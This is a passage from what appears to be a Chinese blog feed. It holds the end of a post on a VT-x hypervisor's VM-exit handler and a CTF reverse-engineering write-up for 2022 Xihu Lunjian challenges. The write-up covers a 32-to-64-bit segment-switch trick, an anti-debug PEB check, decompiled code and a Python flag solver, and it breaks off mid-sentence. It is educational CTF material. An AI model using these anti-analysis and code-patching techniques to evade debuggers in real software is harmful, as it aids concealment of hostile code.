__vmx_vmread(GUEST_RSP);</span><br><span class="line">g_GuestRegs.eip = __vmx_vmread(GUEST_RIP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (ExitReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> EXIT_REASON_CPUID:</span><br><span class="line">HandleCPUID();</span><br><span class="line">Log(<span class="string">&quot;EXIT_REASON_CPUID&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> EXIT_REASON_VMCALL:</span><br><span class="line">HandleVmCall();</span><br><span class="line">Log(<span class="string">&quot;EXIT_REASON_VMCALL&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> EXIT_REASON_CR_ACCESS:</span><br><span class="line">HandleCrAccess();</span><br><span class="line"><span class="comment">//Log(&quot;EXIT_REASON_CR_ACCESS&quot;, 0)</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">27</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">Log(<span class="string">&quot;not handled reason: %p&quot;</span>, ExitReason);</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Resume:</span></span><br><span class="line">GuestResumeEIP = g_GuestRegs.eip + ExitInstructionLength;</span><br><span class="line">__vmx_vmwrite(GUEST_RIP, GuestResumeEIP);</span><br><span class="line">__vmx_vmwrite(GUEST_RSP, g_GuestRegs.esp);</span><br><span class="line">__vmx_vmwrite(GUEST_RFLAGS, g_GuestRegs.eflags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x07-EPT"><a href="#0x07-EPT" class="headerlink" title="0x07 EPT"></a>0x07 EPT</h3><p>看了一下要重建页表我就不想看了。</p><h3 id="0x08-代码"><a href="#0x08-代码" class="headerlink" title="0x08 代码"></a>0x08 代码</h3><p>这个代码魔改的周壑的<code>VT_Learn</code>，建议不要乱魔改，坑非常多。</p>]]></content>
      
      
      
        <tags>
            
            <tag> VT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022西湖论剑部分题目Writeup</title>
      <link href="/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/"/>
      <url>/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/</url>
      
        <content type="html"><![CDATA[<p>题目链接详见：<a href="https://github.com/Randark-JMT/CTF_Archive/releases/tag/2022-xhlj">https://github.com/Randark-JMT/CTF_Archive/releases/tag/2022-xhlj</a></p><span id="more"></span><h2 id="re-部分"><a href="#re-部分" class="headerlink" title="re 部分"></a>re 部分</h2><h3 id="dual-personality"><a href="#dual-personality" class="headerlink" title="dual personality"></a>dual personality</h3><p><code>sub_401120</code> 函数，将返回地址改成 <code>jmp far 33:a2</code>，跳转到64位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401120</span><span class="params">(<span class="type">size_t</span> Size, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [esp+D0h] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  dword_407050 = VirtualAlloc(<span class="number">0</span>, Size + <span class="number">6</span>, <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">  dword_407000 = (<span class="type">int</span>)dword_407050;</span><br><span class="line">  <span class="built_in">memcpy</span>(dword_407050, retaddr, Size);</span><br><span class="line">  v2 = (<span class="type">char</span> *)dword_407050 + Size;</span><br><span class="line">  *v2 = <span class="number">0xE9</span>;</span><br><span class="line">  *(_DWORD *)(v2 + <span class="number">1</span>) = &amp;retaddr[Size] - v2 - <span class="number">5</span>;</span><br><span class="line">  v2[<span class="number">5</span>] = <span class="number">0xCC</span>;</span><br><span class="line">  *retaddr = <span class="number">0xEA</span>;</span><br><span class="line">  *(_DWORD *)(retaddr + <span class="number">1</span>) = a2;</span><br><span class="line">  *(_WORD *)(retaddr + <span class="number">5</span>) = <span class="number">0x33</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要在<code> call sub_401120</code>的下一跳指令处下一个硬件断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ba e1 004013E8</span><br><span class="line">ba e1 00401467</span><br></pre></td></tr></table></figure><p>注意到这一段是ret回来的，很像x64下的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0040146E 48                                         dec     eax</span><br><span class="line">.text:0040146F 8B 04 25 C8 70 40 00                       mov     eax, dword_4070C8</span><br><span class="line">.text:00401476 48                                         dec     eax</span><br><span class="line">.text:00401477 83 F8 20                                   cmp     eax, 20h ; &#x27; &#x27;</span><br><span class="line">.text:0040147A 74 40                                      jz      short loc_4014BC</span><br><span class="line">.text:0040147C 48                                         dec     eax</span><br><span class="line">.text:0040147D 33 D2                                      xor     edx, edx</span><br><span class="line">.text:0040147F 48                                         dec     eax</span><br><span class="line">.text:00401480 B9 04 00 00 00                             mov     ecx, 4</span><br><span class="line">.text:00401480                            ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401485 00                                         db    0</span><br><span class="line">.text:00401486 00                                         db    0</span><br><span class="line">.text:00401487 00                                         db    0</span><br><span class="line">.text:00401488                            ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401488 00 48 F7                                   add     [eax-9], cl</span><br><span class="line">.text:0040148B F1                                         icebp</span><br><span class="line">.text:0040148C 48                                         dec     eax</span><br><span class="line">.text:0040148D 8D 1C 25 14 70 40 00                       lea     ebx, ds:407014h</span><br><span class="line">.text:00401494 8A 14 93                                   mov     dl, [ebx+edx*4]</span><br><span class="line">.text:00401497 48                                         dec     eax</span><br><span class="line">.text:00401498 8B 04 25 C8 70 40 00                       mov     eax, dword_4070C8</span><br><span class="line">.text:0040149F 48                                         dec     eax</span><br><span class="line">.text:004014A0 8D 1C 25 60 70 40 00                       lea     ebx, ds:407060h</span><br><span class="line">.text:004014A7 8A 0C 03                                   mov     cl, [ebx+eax]</span><br><span class="line">.text:004014AA 32 CA                                      xor     cl, dl</span><br><span class="line">.text:004014AC 88 0C 03                                   mov     [ebx+eax], cl</span><br><span class="line">.text:004014AF 48                                         dec     eax</span><br><span class="line">.text:004014B0 FF C0                                      inc     eax</span><br><span class="line">.text:004014B2 48                                         dec     eax</span><br><span class="line">.text:004014B3 89 04 25 C8 70 40 00                       mov     dword_4070C8, eax</span><br><span class="line">.text:004014BA EB B2                                      jmp     short loc_40146E</span><br><span class="line">.text:004014BC                            ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004014BC</span><br><span class="line">.text:004014BC                            loc_4014BC:                             ; CODE XREF: .text:0040147A↑j</span><br><span class="line">.text:004014BC 44                                         inc     esp</span><br><span class="line">.text:004014BD B8 00 70 40 00                             mov     eax, offset dword_407000</span><br><span class="line">.text:004014C2 48                                         dec     eax</span><br><span class="line">.text:004014C3 FF 28                                      jmp     fword ptr [eax]</span><br></pre></td></tr></table></figure><p>main函数扣掉x64的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-8h] [ebp-148h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-4h] [ebp-144h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+0h] [ebp-140h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+4h] [ebp-13Ch]</span></span><br><span class="line">  <span class="type">char</span> Buf2[<span class="number">44</span>]; <span class="comment">// [esp+D0h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+FCh] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+100h] [ebp-40h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+104h] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+108h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+10Ch] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+110h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+114h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+118h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+11Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+128h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v19; <span class="comment">// [esp+134h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))sub_401000)();</span><br><span class="line">  sub_401620(<span class="string">&quot;%99s&quot;</span>, byte_407060);</span><br><span class="line">  sub_401120(<span class="number">7u</span>, (<span class="type">int</span>)dword_4011D0);</span><br><span class="line">  dword_407058 -= <span class="number">559038737</span>;</span><br><span class="line">  v19 = byte_407060;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v19[<span class="number">4</span> * i] += dword_407058;</span><br><span class="line">    dword_407058 ^= *(_DWORD *)&amp;v19[<span class="number">4</span> * i];</span><br><span class="line">  &#125;</span><br><span class="line">  MK_FP(*((_WORD *)&amp;byte_40700C + <span class="number">2</span>), byte_40700C)(byte_407060, <span class="number">0</span>, v4, v5, v6, v7);</span><br><span class="line">  sub_401120(<span class="number">7u</span>, (<span class="type">int</span>)dword_401290);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  Buf2[<span class="number">0</span>] = <span class="number">-86</span>;</span><br><span class="line">  Buf2[<span class="number">1</span>] = <span class="number">79</span>;</span><br><span class="line">  Buf2[<span class="number">2</span>] = <span class="number">15</span>;</span><br><span class="line">  Buf2[<span class="number">3</span>] = <span class="number">-30</span>;</span><br><span class="line">  Buf2[<span class="number">4</span>] = <span class="number">-28</span>;</span><br><span class="line">  Buf2[<span class="number">5</span>] = <span class="number">65</span>;</span><br><span class="line">  Buf2[<span class="number">6</span>] = <span class="number">-103</span>;</span><br><span class="line">  Buf2[<span class="number">7</span>] = <span class="number">84</span>;</span><br><span class="line">  Buf2[<span class="number">8</span>] = <span class="number">44</span>;</span><br><span class="line">  Buf2[<span class="number">9</span>] = <span class="number">43</span>;</span><br><span class="line">  Buf2[<span class="number">10</span>] = <span class="number">-124</span>;</span><br><span class="line">  Buf2[<span class="number">11</span>] = <span class="number">126</span>;</span><br><span class="line">  Buf2[<span class="number">12</span>] = <span class="number">-68</span>;</span><br><span class="line">  Buf2[<span class="number">13</span>] = <span class="number">-113</span>;</span><br><span class="line">  Buf2[<span class="number">14</span>] = <span class="number">-117</span>;</span><br><span class="line">  Buf2[<span class="number">15</span>] = <span class="number">120</span>;</span><br><span class="line">  Buf2[<span class="number">16</span>] = <span class="number">-45</span>;</span><br><span class="line">  Buf2[<span class="number">17</span>] = <span class="number">115</span>;</span><br><span class="line">  Buf2[<span class="number">18</span>] = <span class="number">-120</span>;</span><br><span class="line">  Buf2[<span class="number">19</span>] = <span class="number">94</span>;</span><br><span class="line">  Buf2[<span class="number">20</span>] = <span class="number">-82</span>;</span><br><span class="line">  Buf2[<span class="number">21</span>] = <span class="number">71</span>;</span><br><span class="line">  Buf2[<span class="number">22</span>] = <span class="number">-123</span>;</span><br><span class="line">  Buf2[<span class="number">23</span>] = <span class="number">112</span>;</span><br><span class="line">  Buf2[<span class="number">24</span>] = <span class="number">49</span>;</span><br><span class="line">  Buf2[<span class="number">25</span>] = <span class="number">-77</span>;</span><br><span class="line">  Buf2[<span class="number">26</span>] = <span class="number">9</span>;</span><br><span class="line">  Buf2[<span class="number">27</span>] = <span class="number">-50</span>;</span><br><span class="line">  Buf2[<span class="number">28</span>] = <span class="number">19</span>;</span><br><span class="line">  Buf2[<span class="number">29</span>] = <span class="number">-11</span>;</span><br><span class="line">  Buf2[<span class="number">30</span>] = <span class="number">13</span>;</span><br><span class="line">  Buf2[<span class="number">31</span>] = <span class="number">-54</span>;</span><br><span class="line">  Buf2[<span class="number">32</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(byte_407060, Buf2, <span class="number">0x20</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Right, flag is DASCTF&#123;your input&#125;&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wrong flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一段x64代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  MEMORY[<span class="number">0x40705C</span>] = NtCurrentPeb()-&gt;BeingDebugged;</span><br><span class="line">  <span class="keyword">if</span> ( !MEMORY[<span class="number">0x40705C</span>] )</span><br><span class="line">    MEMORY[<span class="number">0x407058</span>] = <span class="number">1576625838</span>;</span><br><span class="line">  <span class="keyword">return</span> MK_FP(MEMORY[<span class="number">0x407008</span>], MEMORY[<span class="number">0x407000</span>])();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二段扣掉的x64的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_30</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *retaddr[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( MEMORY[<span class="number">0x40705C</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    *retaddr[<span class="number">1</span>] = __ROL8__(*retaddr[<span class="number">1</span>], <span class="number">32</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">1</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">1</span>], <span class="number">32</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">2</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">2</span>], <span class="number">32</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">3</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">3</span>], <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *retaddr[<span class="number">1</span>] = __ROL8__(*retaddr[<span class="number">1</span>], <span class="number">12</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">1</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">1</span>], <span class="number">34</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">2</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">2</span>], <span class="number">56</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">3</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">3</span>], <span class="number">14</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> MK_FP(retaddr[<span class="number">0</span>], retaddr[<span class="number">0</span>])(a1, a2, a3, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三段扣掉的x64代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_160</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( MEMORY[<span class="number">0x4070C8</span>] != <span class="number">32</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = MEMORY[<span class="number">0x4070C8</span>];</span><br><span class="line">    *(_BYTE *)(MEMORY[<span class="number">0x4070C8</span>] + <span class="number">0x407060</span>i64) ^= *(_BYTE *)(<span class="number">4</span> * (MEMORY[<span class="number">0x4070C8</span>] % <span class="number">4u</span>i64) + <span class="number">0x407014</span>);</span><br><span class="line">    MEMORY[<span class="number">0x4070C8</span>] = v0 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> MK_FP(MEMORY[<span class="number">0x407008</span>], MEMORY[<span class="number">0x407000</span>])();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先用magic运算，再ror，再异或</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">int_value, k, bit=<span class="number">64</span></span>):</span><br><span class="line">bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit</span><br><span class="line"></span><br><span class="line">bin_value = bit_string.<span class="built_in">format</span>(int_value)  <span class="comment"># 8 bit binary</span></span><br><span class="line"></span><br><span class="line">bin_value = bin_value[k:] + bin_value[:k]</span><br><span class="line"></span><br><span class="line">int_value = <span class="built_in">int</span>(bin_value, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># right circular shift</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROR</span>(<span class="params">int_value, k, bit=<span class="number">64</span></span>):</span><br><span class="line">bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit</span><br><span class="line"></span><br><span class="line">bin_value = bit_string.<span class="built_in">format</span>(int_value)  <span class="comment"># 8 bit binary</span></span><br><span class="line"></span><br><span class="line">bin_value = bin_value[-k:] + bin_value[:-k]</span><br><span class="line"></span><br><span class="line">int_value = <span class="built_in">int</span>(bin_value, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"><span class="comment"># magic = [0x04,0x77,0x82,0x4a]</span></span><br><span class="line">magic = <span class="number">0x4a8277044a827704</span></span><br><span class="line">enc = [<span class="number">0x549941E4E20F4FAA</span>, <span class="number">0x788B8FBC7E842B2C</span>, <span class="number">0x708547AE5E8873D3</span>, <span class="number">0xCA0DF513CE09B331</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">enc[i] ^= magic</span><br><span class="line">enc[<span class="number">0</span>] = ROR(enc[<span class="number">0</span>],<span class="number">12</span>)</span><br><span class="line">enc[<span class="number">1</span>] = ROR(enc[<span class="number">1</span>],<span class="number">34</span>)</span><br><span class="line">enc[<span class="number">2</span>] = ROR(enc[<span class="number">2</span>],<span class="number">56</span>)</span><br><span class="line">enc[<span class="number">3</span>] = ROR(enc[<span class="number">3</span>],<span class="number">14</span>)</span><br><span class="line">magic2 = <span class="number">0x3ca7259d</span></span><br><span class="line">raw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(enc[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">raw += long_to_bytes(((enc[i] &amp; <span class="number">0xffffffff</span>) - magic2 ) % <span class="number">0x100000000</span>)[::-<span class="number">1</span>]</span><br><span class="line">raw += long_to_bytes(((enc[i] &gt;&gt; <span class="number">32</span>) - (magic2 ^(enc[i] &amp; <span class="number">0xffffffff</span>))  )% <span class="number">0x100000000</span>)[::-<span class="number">1</span>]</span><br><span class="line">magic2 ^= enc[i] &amp; <span class="number">0xffffffff</span></span><br><span class="line">magic2 ^= enc[i] &gt;&gt; <span class="number">32</span></span><br><span class="line"><span class="built_in">print</span>(raw)</span><br><span class="line"><span class="comment"># 0x7d5549941e4e20f4</span></span><br><span class="line"><span class="comment"># 0x1e4e20f4</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>所有逻辑在<code>initterm_e</code>里面</p><p><code>initterm_e</code>可以看作<code>init_array</code></p><p>有三个函数，同时按顺序注册了退出函数</p><p>第一个函数，限制了输入范围在<code>[0-9]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub_4025A0(<span class="string">&quot;Input:&quot;</span>, v2);</span><br><span class="line">sub_402620(<span class="string">&quot;%99s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] &lt; <span class="string">&#x27;0&#x27;</span> || Str[i] &gt; <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个函数 取反了magic，即变成了”012345678”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">    magic1[i] = ~magic1[i];</span><br></pre></td></tr></table></figure><p>第三个函数hook了<code>GetLastError</code>，执行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(magic2, <span class="string">&quot;dcbahgfelkjiponm&quot;</span>, <span class="keyword">sizeof</span>(magic2));</span><br></pre></td></tr></table></figure><p>退出的第一个函数，做了类似base64的编码，base8，每三个字节编码到8个字节，将<code>[16:112]</code>的加密结果进行比对，即知道了<code>[6:42]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base8_encode(Str, (<span class="type">int</span>)&amp;unk_4081C0);</span><br><span class="line">result = <span class="built_in">memcmp</span>(&amp;unk_4081D0, a16230465152334, <span class="number">96u</span>);<span class="comment">// 